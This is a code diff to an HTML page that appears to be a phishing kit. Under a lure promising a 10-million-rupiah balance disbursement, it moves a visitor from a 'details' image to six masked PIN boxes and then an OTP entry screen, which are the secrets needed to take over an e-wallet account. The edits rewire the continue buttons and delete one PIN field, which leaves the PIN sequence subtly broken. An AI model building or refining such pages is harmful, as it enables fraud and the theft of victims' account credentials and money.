@@ -510,7 +510,7 @@
     <!-- Page2 Rincian -->
     <div id="Page2" class="page2" style="display: none">
       <img src="https://pencairan-aktivasi-saldodana10juta.vercel.app/rincian.png" alt="e.png" width="100%">
-      <button onclick="showPage2()">Lanjut</button>
+      <button onclick="showPage3()">Lanjut</button>
     </div>
 
     <!-- Page3 PIN -->
@@ -523,7 +523,6 @@
         <input type="password" id="pin1" maxlength="1" class="pin-box" inputmode="numeric" oninput="checkAndEnable(this, 'pin2')">
         <input type="password" id="pin2" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin3')" onkeydown="moveToPrev(event, 'pin1')">
         <input type="password" id="pin3" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin4')" onkeydown="moveToPrev(event, 'pin2')">
-        <input type="password" id="pin4" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin5')" onkeydown="moveToPrev(event, 'pin3')">
         <input type="password" id="pin5" maxlength="1" class="pin-box" inputmode="numeric" disabled oninput="checkAndEnable(this, 'pin6')" onkeydown="moveToPrev(event, 'pin4')">
         <input type="password" id="pin6" maxlength="1" class="pin-box" inputmode="numeric" disabled onkeydown="moveToPrev(event, 'pin5')" oninput="showPage4()">
       </div>
@@ -545,7 +544,7 @@
       <span class="btntmr" id="resendButton" disabled>Kirim Ulang: 320s</span>
       <p id="peringatanOtp" style="display: none; color: red; font-size: 14px;">Kode OTP harus diisi..!</p>
       <div class="btnOtp">
-        <button onclick="showPage4a()">Lanjut</button>
+        <button onclick="showPage4()">Lanjut</button>
       </div>
     </div>
 
